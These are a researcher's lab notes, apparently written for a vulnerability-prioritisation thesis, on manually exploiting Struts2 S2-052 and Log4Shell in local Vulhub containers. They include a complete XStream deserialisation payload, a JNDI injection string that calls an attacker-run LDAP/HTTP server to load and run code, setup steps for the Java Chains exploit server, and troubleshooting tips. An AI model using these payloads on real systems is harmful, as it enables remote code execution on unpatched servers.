# Kalama Lab Notes: Full Manual Exploitation Walkthrough
## CVE-2021-44228 (Log4Shell) & CVE-2017-9805 (S2-052 Struts2)

**วันที่:** 14-15 July 2026  
**ผู้ทดสอบ:** Natapat  
**Environment:** KVM Ubuntu VM (test@test-Standard-PC-i440FX-PIIX-1996)  
**โปรเจค:** GUIDE-1: Exploitation-Validated Vulnerability Prioritization (Kalama)

---

## 📋 สรุปผลรวม

| CVE | Target | Predicted | Exploited | Evidence |
|-----|--------|-----------|-----------|----------|
| CVE-2017-9805 | Struts2 2.5.12 | HIGH | ✅ YES | `/tmp/success` |
| CVE-2021-44228 | Solr 8.11.0 + Log4j 2.14.1 | HIGH | ✅ YES | `/tmp/success` |

---

## 🏗️ Part 0: Environment Setup

### 0.1 Clone Vulhub testbed

```bash
test@test-Standard-PC-i440FX-PIIX-1996:~$ cd ~
test@test-Standard-PC-i440FX-PIIX-1996:~$ git clone --depth 1 https://github.com/vulhub/vulhub.git
Cloning into 'vulhub'...
Updating files: 100% (2858/2858), done.
```

### 0.2 ตรวจสอบ Vulhub structure

```bash
test@test-Standard-PC-i440FX-PIIX-1996:~$ ls ~/vulhub/struts2/
README.md  s2-001  s2-005  s2-007  s2-008  s2-009  s2-012  s2-013  s2-015
s2-016  s2-032  s2-045  s2-046  s2-048  s2-052  s2-053  s2-057  s2-059
s2-061  s2-066  s2-067

test@test-Standard-PC-i440FX-PIIX-1996:~$ ls ~/vulhub/log4j/
CVE-2017-5645  CVE-2021-44228
```

### 0.3 Dependency Check Script

```bash
test@test-Standard-PC-i440FX-PIIX-1996:~$ docker --version
Docker version 29.6.1, build 8900f1d

test@test-Standard-PC-i440FX-PIIX-1996:~$ java -version
openjdk version "1.8.0_492"
OpenJDK Runtime Environment (build 1.8.0_492-8u492-ga~us2-0ubuntu1~26.04.1-b09)
OpenJDK 64-Bit Server VM (build 25.492-b09, mixed mode)
```

---

## ⚡ Part 1: CVE-2017-9805 — Struts2 S2-052 (XStream Deserialization RCE)

### 1.1 ข้อมูล Vulnerability

| รายการ | ค่า |
|--------|-----|
| CVE | CVE-2017-9805 |
| CVSS | 9.8 (Critical) |
| Affected | Struts 2.1.2 – 2.3.33, 2.5 – 2.5.12 |
| Root Cause | XStream REST plugin deserialize XML โดยไม่ validate |
| Type | Java Deserialization → RCE |

### 1.2 ดู README

```bash
test@test-Standard-PC-i440FX-PIIX-1996:~$ cat ~/vulhub/struts2/s2-052/README.md
# S2-052 Remote Code Execution Vulnerability

Affected Version: Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12

## Exploit
POST /orders/3/edit HTTP/1.1
Content-Type: application/xml
...
<next class="java.lang.ProcessBuilder">
  <command>
    <string>touch</string>
    <string>/tmp/success</string>
  </command>
...

test@test-Standard-PC-i440FX-PIIX-1996:~$ cat ~/vulhub/struts2/s2-052/docker-compose.yml
version: '2'
services:
 struts2:
   image: vulhub/struts2:2.5.12-rest-showcase
   ports:
    - "8080:8080"
```

### 1.3 Start Container

```bash
test@test-Standard-PC-i440FX-PIIX-1996:~$ cd ~/vulhub/struts2/s2-052
test@test-Standard-PC-i440FX-PIIX-1996:~/vulhub/struts2/s2-052$ docker compose up -d
WARN[0000] ...docker-compose.yml: the attribute `version` is obsolete...
[+] Running 2/2
 ✔ Image vulhub/struts2:2.5.12-rest-showcase Pulled   70.8s
 ✔ Container s2-052-struts2-1                Started    3.5s
```

### 1.4 ตรวจสอบว่า Struts2 พร้อม

```bash
test@test-Standard-PC-i440FX-PIIX-1996:~/vulhub/struts2/s2-052$ curl http://localhost:8080/orders/3/edit
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Orders</title>
...
<h1>Order 3</h1>
...
# HTTP 200 ✅ — Struts2 พร้อมใช้
```

### 1.5 ยิง Exploit Payload

**ทำไม payload นี้ถึงทำงาน:**
```
HashMap.put()
  → NativeString.hashCode()       ← entry ที่ 2 force trigger
  → Base64Data.toString()
  → CipherInputStream.read()
  → NullCipher.update()
  → FilterIterator (ContainsFilter.name = "foo")
  → ProcessBuilder.start()        ← execute command!
  → touch /tmp/success ✅
```

```bash
test@test-Standard-PC-i440FX-PIIX-1996:~/vulhub/struts2/s2-052$ curl -X POST \
  -H "Content-Type: application/xml" \
  -d '<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>touch</string>
                        <string>/tmp/success</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>' \
  http://localhost:8080/orders/3/edit

<!doctype html><html lang="en">
<h1>HTTP Status 500 – Internal Server Error</h1>
<p>java.lang.String cannot be cast to java.security.Provider$Service</p>
...
# HTTP 500 = gadget chain execute แล้ว error ปกติ ✅
```

### 1.6 ตรวจสอบผล

```bash
test@test-Standard-PC-i440FX-PIIX-1996:~/vulhub/struts2/s2-052$ docker compose exec struts2 ls /tmp/
hsperfdata_root  success

# ✅ /tmp/success ถูกสร้างใน container = EXPLOITED!
```

### 1.7 Kalama Record

```
CVE:        CVE-2017-9805
Predicted:  HIGH
Exploited:  TRUE ✅
Evidence:   /tmp/success created in container
Status:     VERIFIED EXPLOITABLE
```

---

## 🔥 Part 2: CVE-2021-44228 — Log4Shell (JNDI Injection RCE)

### 2.1 ข้อมูล Vulnerability

| รายการ | ค่า |
|--------|-----|
| CVE | CVE-2021-44228 |
| CVSS | 10.0 (Maximum) |
| EPSS | 0.97 (97%) |
| KEV | YES (CISA Known Exploited) |
| Affected | Log4j 2.x < 2.15.0 |
| Target | Apache Solr 8.11.0 + Log4j 2.14.1 |
| JDK | 8u102 (< 8u191 = vulnerable to JNDI RCE) |

### 2.2 ดู README และ docker-compose.yml

```bash
test@test-Standard-PC-i440FX-PIIX-1996:~$ cat ~/vulhub/log4j/CVE-2021-44228/README.md
# Apache Log4j2 JNDI injection (CVE-2021-44228)

## Exploit
GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.example.com} HTTP/1.1

For vulnerability exploitation, use Java Chains. Follow JNDI Basic Exploitation Guide
to configure command `touch /tmp/success` and generate a JNDI LDAP URL Payload.

test@test-Standard-PC-i440FX-PIIX-1996:~$ cat ~/vulhub/log4j/CVE-2021-44228/docker-compose.yml
version: '2'
services:
 solr:
   image: vulhub/solr:8.11.0
   ports:
    - "8983:8983"
    - "5005:5005"
```

### 2.3 Start Solr Container

```bash
test@test-Standard-PC-i440FX-PIIX-1996:~$ cd ~/vulhub/log4j/CVE-2021-44228
test@test-Standard-PC-i440FX-PIIX-1996:~/vulhub/log4j/CVE-2021-44228$ docker compose up -d
WARN[0000] ...version` is obsolete...
[+] Running 2/2
 ✔ Network cve-2021-44228_default  Created
 ✔ Container cve-2021-44228-solr-1 Started
```

### 2.4 Verify Vulnerable Components

```bash
# ตรวจสอบ Log4j version
test@test-Standard-PC-i440FX-PIIX-1996:~/vulhub/log4j/CVE-2021-44228$ docker compose exec solr bash -c "find /opt/solr -name 'log4j-core*.jar'"
WARN[0000] ...version` is obsolete...
/opt/solr/contrib/prometheus-exporter/lib/log4j-core-2.14.1.jar
/opt/solr/server/lib/ext/log4j-core-2.14.1.jar
# ✅ Log4j 2.14.1 = vulnerable!

# ตรวจสอบ Java version
test@test-Standard-PC-i440FX-PIIX-1996:~/vulhub/log4j/CVE-2021-44228$ docker compose exec solr bash -c "java -version"
openjdk version "1.8.0_102"
OpenJDK Runtime Environment (build 1.8.0_102-8u102-b14.1-1~bpo8+1-b14)
OpenJDK 64-Bit Server VM (build 25.102-b14, mixed mode)
# ✅ 8u102 < 8u191 = JNDI RCE ได้!

# ตรวจสอบ Network: Container → Host
test@test-Standard-PC-i440FX-PIIX-1996:~/vulhub/log4j/CVE-2021-44228$ docker exec cve-2021-44228-solr-1 bash -c "hostname -I"
172.18.0.2
# Container IP = 172.18.0.2
# Docker gateway (Host IP) = 172.18.0.1

test@test-Standard-PC-i440FX-PIIX-1996:~/vulhub/log4j/CVE-2021-44228$ docker exec cve-2021-44228-solr-1 bash -c "ping -c 1 172.18.0.1"
PING 172.18.0.1 (172.18.0.1): 56 data bytes
64 bytes from 172.18.0.1: icmp_seq=0 ttl=64 time=0.148 ms
--- 172.18.0.1 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
# ✅ Container ถึง Host ได้ผ่าน 172.18.0.1
```

### 2.5 ตรวจสอบ Solr ทำงาน

```bash
test@test-Standard-PC-i440FX-PIIX-1996:~/vulhub/log4j/CVE-2021-44228$ sleep 20
test@test-Standard-PC-i440FX-PIIX-1996:~/vulhub/log4j/CVE-2021-44228$ curl -I http://localhost:8983/solr/
HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Content-Length: 16555
# ✅ Solr พร้อม
```

### 2.6 Setup Java Chains (LDAP + HTTP Server)

Java Chains เป็น all-in-one exploit server ที่มี:
- LDAP server รอรับ JNDI lookup request
- HTTP server serve malicious .class file
- Web UI สำหรับ configure payload

```bash
# ตรวจสอบ Java Chains container (รันอยู่แล้ว)
test@test-Standard-PC-i440FX-PIIX-1996:~/vulhub/log4j/CVE-2021-44228$ docker ps | grep java
d14fd3f20ba3   javachains/javachains:latest    "/__cacert_entrypoin…"
   Ports: 0.0.0.0:8011->8011/tcp (UI)
          0.0.0.0:50389->50389/tcp (LDAP)
          0.0.0.0:50388->50388/tcp (RMI)
          0.0.0.0:58080->58080/tcp (HTTP/class server)

# ดู password จาก logs
test@test-Standard-PC-i440FX-PIIX-1996:~/vulhub/log4j/CVE-2021-44228$ docker logs d14fd3f20ba3 2>&1 | grep -i "username\|password"
07-14 08:20:47.051 INFO c.a.c.w.c.SecurityConfig | username: admin
07-14 08:20:47.052 INFO c.a.c.w.c.SecurityConfig | password: NqvDhVhTFmeMjC0J
```

### 2.7 Login Java Chains Web UI

เปิด browser ไปที่: **http://127.0.0.1:8011**

```
Username: admin
Password: NqvDhVhTFmeMjC0J
```

**[📸 รูปที่ 1: Java Chains Login Page]**
```
[INSERT SCREENSHOT: Java Chains Studio login page]
URL: http://127.0.0.1:8011/#studio
```

### 2.8 Configure JNDI Payload ใน Java Chains

#### Step A: เลือก Mode = JNDI

คลิกที่แถบ **"JNDI"** (ด้านบน)

**[📸 รูปที่ 2: เลือก JNDI mode]**
```
[INSERT SCREENSHOT: Mode bar with JNDI selected (orange)]
Mode: Generate | [JNDI] | Fake MySQL | JRMPListener | TCP Server | HTTP Server
```

#### Step B: เลือก Payload = JNDIBasicPayload

ในช่อง PAYLOAD ทางซ้าย คลิก **JNDIBasicPayload**

```
PAYLOAD: JNDIBasicPayload
Description: LDAP远程加载字节码
适用场景: 较低的JDK版本 JNDI基础的利用姿势: 远程加载字节码
Dependencies: jdk < 8u191, jdk < 7u201, 6u211, jdk < 11.0.1
```

**[📸 รูปที่ 3: JNDIBasicPayload ถูกเลือก]**
```
[INSERT SCREENSHOT: JNDIBasicPayload selected with blue dot]
```

#### Step C: เลือก Gadget 1 = BytecodeConvert

ในช่อง GADGET 1 ทางขวา เลือก **BytecodeConvert**

```
GADGET 1: BytecodeConvert
Description: 处理字节码
对字节码进行处理, 比如修改类名、实现特定接口、插入特定函数...
```

**[📸 รูปที่ 4: BytecodeConvert ถูกเลือกใน GADGET 1]**
```
[INSERT SCREENSHOT: BytecodeConvert selected with green dot]
```

#### Step D: เลือก Gadget 2 = Exec

ในช่อง GADGET 2 เลือก **Exec**

```
GADGET 2: Exec
Description: 执行命令
使用 ProcessBuilder 执行命令的字节码, 自动识别 win/linux
```

**[📸 รูปที่ 5: Chain Map สมบูรณ์]**
```
[INSERT SCREENSHOT: Chain Map showing: JNDIBasicPayload → BytecodeConvert → Exec]
Status: COMPLETE(END) ✅
```

#### Step E: ตั้ง Command ใน Exec

คลิก **Inspect** บน Exec → เปลี่ยน cmd จาก `calc` เป็น `touch /tmp/success`

```
GADGET INSPECTOR: Exec
Parameters:
  命令 (cmd): touch /tmp/success    ← เปลี่ยนตรงนี้
  [Required] [String]
```

**[📸 รูปที่ 6: ตั้ง command ใน Exec Inspector]**
```
[INSERT SCREENSHOT: Exec Gadget Inspector with cmd = "touch /tmp/success"]
```

### 2.9 ตั้ง Public IP ใน Servers (จุดสำคัญ!)

ไปที่เมนู **"Servers"** ทางซ้าย → JNDI Server section

```
Public IP: [127.0.0.1] ← เปลี่ยนเป็น 172.18.0.1
Listen IP: 172.18.0.1
LDAP port: 50389
HTTP port: 58080
```

**เหตุผลที่ต้องเปลี่ยน:**
```
❌ 127.0.0.1 = LDAP reference redirect ไป http://127.0.0.1:58080/...
              Container เข้าถึง 127.0.0.1 ของ host ไม่ได้!

✅ 172.18.0.1 = LDAP reference redirect ไป http://172.18.0.1:58080/...
              172.18.0.1 คือ Docker gateway = Host จากมุมมอง container
```

**[📸 รูปที่ 7: Server Config — Public IP = 172.18.0.1]**
```
[INSERT SCREENSHOT: Servers page with Public IP set to 172.18.0.1, JNDI Server ONLINE]
```

กด **Stop** แล้ว **Start** ใหม่ เพื่อ apply config

### 2.10 Generate LDAP URL

กลับไปหน้า Studio → กด **Generate**

```bash
OUTPUT: OK • 19ms • Raw 58B • Enc 58B

ldap://172.18.0.1:50389/ea1d7b     ← ใช้ URL นี้
rmi://172.18.0.1:50388/ea1d7b
```

**[📸 รูปที่ 8: Generate Output — ได้ LDAP URL]**
```
[INSERT SCREENSHOT: Output panel showing ldap://172.18.0.1:50389/ea1d7b]
```

### 2.11 ยิง Exploit

**ทำไม payload ถึงทำงาน:**
```
${jndi:ldap://172.18.0.1:50389/ea1d7b}
  ↑
  Log4j เห็น expression นี้ใน log message
  → invoke JNDI lookup
  → JVM ยิง LDAP query ไป 172.18.0.1:50389
  → Java Chains ตอบ: "โหลด class จาก http://172.18.0.1:58080/ea1d7b"
  → JVM โหลด malicious .class
  → constructor ถูกเรียก → exec("touch /tmp/success")
```

**ทำไมใช้ `%7B%7D` ไม่ใช่ `{}`:**
```bash
# ❌ Shell expand {} ก่อนส่ง
curl '...?core=${jndi:ldap://...}'
# curl ส่ง: "...?core=$jndi:ldap:..."  (ขาด {})
# Log4j ไม่ parse เพราะ format ไม่ใช่ ${...}

# ✅ URL encode { = %7B, } = %7D
curl '...?core=$%7Bjndi:ldap://...%7D'
# curl ส่ง: "...?core=${jndi:ldap://...}"
# Log4j parse และ invoke JNDI ✅
```

```bash
test@test-Standard-PC-i440FX-PIIX-1996:~/vulhub/log4j/CVE-2021-44228$ curl 'http://localhost:8983/solr/admin/cores?core=$%7Bjndi:ldap://172.18.0.1:50389/ea1d7b%7D'
{
  "responseHeader":{
    "status":0,
    "QTime":0},
  "initFailures":{},
  "status":{
    "ldap://172.18.0.1:50389/ea1d7b":{}}}
# ✅ HTTP 200 — Solr รับ + Log4j process แล้ว
```

### 2.12 Evidence จาก Java Chains Logs

```bash
test@test-Standard-PC-i440FX-PIIX-1996:~/vulhub/log4j/CVE-2021-44228$ docker logs d14fd3f20ba3 2>&1 | tail -10
07-14 18:54:57.513 INFO [LDAPListener from 172.17.0.1:44794 to 172.17.0.2:50389]
   c.a.c.web.jndi.core.Cache | New Cache File: org.apache.beanutils...d637be0c 928 bytes

07-14 18:54:57.536 INFO [LDAPListener]
   c.a.c.w.j.OperationInterceptor | Received LDAP Query: ea1d7b   ← ✅ LDAP request เข้ามา!

07-14 18:54:57.537 INFO [LDAPListener]
   c.a.c.w.j.c.i.BasicController | [ea1d7b] Basic Exploit Start -----

07-14 18:54:57.538 INFO [LDAPListener]
   c.a.c.w.j.c.i.BasicController | [ea1d7b] Bytecode className: org.apache.beanutils...

07-14 18:54:57.544 INFO [LDAPListener]
   c.a.c.w.j.c.i.BasicController | [ea1d7b] Send LDAP reference result: redirecting to http://172.18.0.1:58080/...

07-14 18:54:57.544 INFO [LDAPListener]
   c.a.c.w.j.c.i.BasicController | [ea1d7b] Basic Gadget 1 Exploit Successfully  ← ✅ SUCCESS!
```

### 2.13 ตรวจสอบผล

```bash
test@test-Standard-PC-i440FX-PIIX-1996:~/vulhub/log4j/CVE-2021-44228$ docker exec cve-2021-44228-solr-1 bash -c "ls /tmp/success"
/tmp/success
# ✅ /tmp/success ถูกสร้างใน Solr container = EXPLOITED!
```

### 2.14 Kalama Record

```bash
test@test-Standard-PC-i440FX-PIIX-1996:~/vulhub/log4j/CVE-2021-44228$ echo "CVE-2021-44228,HIGH,True,2026-07-15" >> ~/kalama_results.csv
test@test-Standard-PC-i440FX-PIIX-1996:~/vulhub/log4j/CVE-2021-44228$ cat ~/kalama_results.csv
CVE-2017-9805,HIGH,True,2026-07-14
CVE-2021-44228,HIGH,Inconclusive,2026-07-14
CVE-2021-44228,HIGH,True,2026-07-15
```

---

## 🔍 Part 3: Debug Log — ปัญหาที่เจอระหว่างทาง

### ปัญหา 1: nc listener ไม่ใช่ LDAP server

**อาการ:** ยิง payload แล้ว nc ไม่แสดง callback

```bash
# ❌ วิธีที่ผิด
test@test-Standard-PC-i440FX-PIIX-1996:~$ nc -lnvp 4444
Listening on 0.0.0.0 4444
# (ยิง curl ไปแล้ว)
# ← ไม่มีอะไรเกิดขึ้น

# tcpdump ยืนยัน: 0 packets captured
test@test-Standard-PC-i440FX-PIIX-1996:~$ sudo tcpdump -i docker0 -n "host 172.18.0.1 and port 4444" -vv
tcpdump: listening on docker0
^C
0 packets captured
0 packets received by filter
```

**สาเหตุ:**
```
nc = TCP listener ธรรมดา
JNDI lookup = ต้องการ LDAP protocol จริง (มี handshake, response format เฉพาะ)
Log4j ส่ง LDAP query มา → nc ไม่รู้ protocol → ตอบ garbage → JNDI ล้มเหลว
→ ไม่มี TCP packet ออกจาก container เลย (เพราะ JNDI invoke ไม่เกิด)
```

**แก้:** ใช้ Java Chains ซึ่งเป็น LDAP server จริง

---

### ปัญหา 2: Docker Network Isolation

**อาการ:** ยิงไป `127.0.0.1:4444` ไม่มี callback

```bash
# ❌ ผิด — 127.0.0.1 ของ container ≠ 127.0.0.1 ของ host
curl '...core=${jndi:ldap://127.0.0.1:4444/exploit}'
# Container มอง 127.0.0.1 = ตัวเอง ไม่ใช่ host!

# ตรวจสอบ IP ที่ถูก
test@test-Standard-PC-i440FX-PIIX-1996:~$ docker exec cve-2021-44228-solr-1 bash -c "hostname -I"
172.18.0.2
# Container = .2, Host gateway = .1

# ✅ ถูก — ใช้ Docker gateway
curl '...core=${jndi:ldap://172.18.0.1:50389/ea1d7b}'
```

---

### ปัญหา 3: Shell expand `${}` ก่อน curl ส่ง

**อาการ:** Log แสดง `$jndi:...` แทน `${jndi:...}`

```bash
# ❌ Shell expand { } ก่อน
curl '...?core=${jndi:ldap://172.18.0.1:50389/ea1d7b}'
# Solr ได้: "params={core=$jndi:ldap://..."
# (ขาด { หลัง $)
# Log4j ไม่ parse เป็น lookup expression

# ✅ URL encode
curl '...?core=$%7Bjndi:ldap://172.18.0.1:50389/ea1d7b%7D'
# Solr ได้: "params={core=${jndi:ldap://..."
# Log4j parse และ invoke JNDI ✅
```

---

### ปัญหา 4: Java Chains Public IP ผิด

**อาการ:** LDAP callback เข้ามาแต่ `/tmp/success` ไม่ถูกสร้าง

```bash
# Solr log แสดง:
# params={core=Reference Class Name: foo}
# ← Solr ได้รับ LDAP reference แต่ไม่โหลด class

# สาเหตุ: Java Chains redirect ไป http://127.0.0.1:58080/... 
# Container เข้าถึง 127.0.0.1 ของ host ไม่ได้!
```

**แก้:** ตั้ง Public IP ใน Java Chains เป็น `172.18.0.1`

```
Java Chains → Servers → JNDI Server → Public IP: 172.18.0.1
→ Stop → Start
→ Generate payload ใหม่ → ldap://172.18.0.1:50389/ea1d7b
→ ยิงใหม่ → ✅ สำเร็จ
```

---

## 📊 Part 4: สรุป Exploit Flow เปรียบเทียบ

### CVE-2017-9805 (ง่าย — 3 steps)

```
[Attacker] curl POST XML
     ↓
[Victim] Struts2 XStream deserialize
     ↓
[Victim] ProcessBuilder.start() → touch /tmp/success ✅
```

### CVE-2021-44228 (ซับซ้อน — 8 steps)

```
[Attacker] curl GET ?core=${jndi:ldap://172.18.0.1:50389/ea1d7b}
     ↓
[Victim] Solr รับ request → log parameter ผ่าน Log4j
     ↓
[Victim] Log4j parse ${jndi:...} → invoke JNDI lookup
     ↓
[Victim JVM] ยิง LDAP query → [Attacker] Java Chains LDAP (50389)
     ↓
[Attacker] Java Chains ตอบ: "redirect to http://172.18.0.1:58080/ea1d7b"
     ↓
[Victim JVM] HTTP GET → [Attacker] Java Chains HTTP (58080)
     ↓
[Attacker] ส่ง malicious .class กลับ
     ↓
[Victim JVM] โหลด + execute class → touch /tmp/success ✅
```

---

## 🎓 Part 5: Kalama Thesis Insights

### Scoring vs Reality

```
CVE-2017-9805:
  CVSS:       9.8 → HIGH ✅
  Exploited:  YES ✅
  Complexity: LOW (1 HTTP request)
  → True Positive ✅

CVE-2021-44228:
  CVSS:       10.0 → HIGH ✅
  EPSS:       0.97 → HIGH ✅
  KEV:        YES ✅
  Exploited:  YES ✅ (แต่ต้องการ setup ซับซ้อนมาก)
  → True Positive ✅ (แต่ real-world ยากกว่า score บอก)
```

### สิ่งที่ CVSS ไม่ได้บอก

| CVSS บอก | CVSS ไม่บอก |
|----------|-------------|
| Base severity | Exploit complexity จริง |
| Impact | Tools/infrastructure ที่ต้องการ |
| Attack vector | Network configuration constraints |
| Prerequisites | Time to exploit |

### False Classification Risk

```
CVE-2021-44228 first attempt:
  Status: INCONCLUSIVE (ขาด Java Chains, ตั้ง IP ผิด)
  ถ้าหยุดตรงนี้ → จะ classify เป็น False Positive ผิด!
  
  Reality: เป็น True Positive แต่ต้องการ proper setup
  → Classification ควรเป็น: "Verified Exploitable with Prerequisites"
```

### Proposed Kalama Classification

```
1. Verified Exploitable    → ยิงได้ทันที (CVE-2017-9805)
2. Verified Exploitable    → ยิงได้ แต่ต้องการ setup พิเศษ (CVE-2021-44228)
   (with Prerequisites)
3. Verified Mitigated      → มี mitigation ทำให้ยิงไม่ได้
4. Inconclusive            → ยังสรุปไม่ได้ ขาดหลักฐาน
5. False Positive          → CVE มีแต่ไม่ affect environment นี้
```

---

## 📁 Results

```csv
# ~/kalama_results.csv
CVE,Predicted,Exploited,Date
CVE-2017-9805,HIGH,True,2026-07-14
CVE-2021-44228,HIGH,True,2026-07-15
```

---

## 🖼️ Screenshot Checklist

- [ ] รูปที่ 1: Java Chains Login Page
- [ ] รูปที่ 2: เลือก JNDI mode (orange tab)
- [ ] รูปที่ 3: JNDIBasicPayload selected
- [ ] รูปที่ 4: BytecodeConvert ใน GADGET 1
- [ ] รูปที่ 5: Exec ใน GADGET 2 + Chain Map COMPLETE(END)
- [ ] รูปที่ 6: Exec Inspector — cmd = "touch /tmp/success"
- [ ] รูปที่ 7: Servers — Public IP = 172.18.0.1, ONLINE
- [ ] รูปที่ 8: Generate Output — ldap://172.18.0.1:50389/ea1d7b

---

*Lab Notes — Kalama Project, 14-15 July 2026*
